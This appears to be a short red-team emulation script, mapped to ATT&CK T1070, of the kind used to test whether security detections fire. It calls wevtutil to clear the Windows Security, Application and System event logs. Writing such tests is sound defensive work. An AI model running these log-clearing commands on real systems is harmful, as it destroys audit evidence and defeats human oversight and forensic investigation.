# Name: Clearing Windows Event Logs
# rta: wevutil_log_clear.py
# ATT&CK: T1070
# Description: Uses the native Windows Event utility to clear the Security, Application and System event logs.

import time
import common


def main():
    common.log("Clearing Windows Event Logs", "!")
    time.sleep(3)
    wevtutil = "wevtutil.exe"

    for log in ["security", "application", "system"]:
        common.execute([wevtutil, "cl", log])
    

if __name__ == "__main__":
    exit(main())
